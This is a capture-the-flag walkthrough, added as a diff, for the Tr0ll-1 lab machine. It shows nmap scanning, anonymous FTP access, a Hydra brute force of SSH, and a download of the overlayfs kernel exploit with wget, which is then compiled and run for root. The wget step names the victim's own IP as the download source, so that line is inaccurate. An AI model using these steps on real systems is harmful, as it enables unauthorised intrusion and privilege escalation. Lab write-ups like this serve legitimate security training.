@@ -1,0 +1,166 @@
+Tr0ll-1:
+
+
+
+1> Find the ip address with
+
+arp-scan -l or netdiscover command
+
+2>once you have the ip-
+scan with nmap
+
+nmap -sV 192.168.2.13
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-03 03:03 EDT
+Nmap scan report for 192.168.2.13
+Host is up (0.00014s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+MAC Address: 08:00:27:75:F9:40 (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
+
+3> port 80 is open, so, try this ip address in the browser, and use dirb "http://192.168.2.13" to find other hidden web pages.
+
+got nothing
+
+4>next try to get into ftp server
+
+ftp 192.168.2.13
+
+name: (hit enter by leaving it blank)
+
+it will tell you about anonymous login
+
+exit
+
+
+again get into ftp
+
+this time
+
+name: anonymous
+
+password: (blank)
+
+log in successfull
+
+ftp> dir
+
+
+you will see a file called lol.pcap
+
+
+ftp> get lol.pcap
+
+exit
+
+
+
+now open wireshark and open lol.pcap
+
+
+after reading the packets we've found a secret text
+
+sup3rs3cr3tdirlol
+
+paste it in the browser with ip
+
+
+192.168.2.13/sup3rs3cr3tdirlol
+
+
+it will take you to a web page where you will se a file called roflmao
+
+download that file and read it through notepad
+
+there a hidden address is found
+
+0x0856BF
+
+again add this to url
+
+http://192.168.2.13/0x0856BF/
+
+it will take you to another page
+
+here copy all the usernames in a file and save and copy the password also and save in a file in dekstop
+
+
+then use hydra gtk
+
+where you have to metion targets, ports, protocols and username list and password list then start(in this case we are trying to bruteforce ssh service so the port will be 22 and the protocol will be ssh)
+
+
+after that you will get the username and password
+
+Now login to ssh
+
+ssh overflow@192.168.2.13 
+
+and type the password
+
+you will get inside the Tr0ll terminal
+
+$ uname -a
+
+
+you will get the kernel version of the os
+
+3.13.0
+
+again 
+use
+
+lsb_release -a
+to get the os version this time
+
+14.04
+
+open another terminal
+and type
+
+searchsploit linux 3.13.0
+
+to find the exploit 
+It will be like this : Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation 
+after  you found the exploit
+
+Thn You have to locate it 
+command: locate 37292.c
+
+copy it to your local server folder 
+command:cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html
+
+and turn the apache server on
+Command: service apache2 start
+
+
+then
+go to victim terminal and get into tmp folder
+
+
+then type:
+
+wget "192.168.2.13/37292.c"
+
+now the file has been downloaded inside the victim machine
+
+
+now you have to compile and run it
+
+
+gcc -o exploit 37292.c
+
+./exploit
+
+Here You go , you have the root id.
+and here is the falg---
+flag 702a8c18d29c6f3ca0d99ef5712bfbdc
+
+
